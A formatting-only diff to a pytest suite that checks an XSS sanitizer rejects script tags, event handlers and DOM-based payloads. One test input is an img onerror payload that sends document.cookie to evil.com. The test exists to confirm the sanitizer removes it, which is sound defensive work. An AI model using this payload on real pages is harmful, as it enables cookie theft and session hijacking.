@@ -9,7 +9,8 @@ Compliance: OWASP XSS, HIPAA §164.312(e)(1), SOC 2 CC7.2
 """
 
 import pytest
-from app.services.llm_sanitization import LLMSanitizer, ContentType
+
+from app.services.llm_sanitization import ContentType, LLMSanitizer
 
 
 class TestXSSPrevention:
@@ -34,7 +35,10 @@ class TestXSSPrevention:
         assert "alert(" not in result.sanitized
         # Script tags are detected as JAVASCRIPT content type
         assert result.content_type in [ContentType.JAVASCRIPT, ContentType.HTML]
-        assert any("JavaScript" in mod or "script" in mod.lower() or "HTML" in mod for mod in result.modifications)
+        assert any(
+            "JavaScript" in mod or "script" in mod.lower() or "HTML" in mod
+            for mod in result.modifications
+        )
 
     def test_blocks_script_tags_with_attributes(self, sanitizer):
         """Verify <script> tags with attributes are removed"""
@@ -182,7 +186,7 @@ class TestXSSPrevention:
 
     def test_blocks_dom_based_xss(self, sanitizer):
         """Verify DOM-based XSS patterns are blocked"""
-        malicious = '<img src=x onerror="document.location=\'http://evil.com/\'+document.cookie">'
+        malicious = "<img src=x onerror=\"document.location='http://evil.com/'+document.cookie\">"
         result = sanitizer.sanitize(malicious, content_type="text")
 
         assert "onerror=" not in result.sanitized
@@ -267,6 +271,9 @@ class TestXSSPreventionStrictMode:
         result = sanitizer.sanitize(javascript, content_type="text", strict_mode=True)
 
         # Should detect it's actually code/javascript, not text
-        assert result.content_type == ContentType.JAVASCRIPT or result.content_type == ContentType.CODE
+        assert (
+            result.content_type == ContentType.JAVASCRIPT
+            or result.content_type == ContentType.CODE
+        )
         assert len(result.warnings) > 0
         assert any("mismatch" in w.lower() for w in result.warnings)
